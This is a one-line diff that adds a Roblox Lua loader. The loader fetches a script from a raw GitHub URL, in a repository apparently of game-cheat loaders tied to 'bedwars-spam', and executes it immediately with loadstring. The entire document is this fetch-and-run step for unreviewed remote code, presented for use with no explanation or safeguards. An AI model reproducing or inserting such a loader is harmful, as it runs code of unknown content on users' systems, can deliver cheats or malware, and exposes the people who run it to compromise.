@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/part-2-bedwars-spam6-xrvv8bnoo41fl5.lua"))()
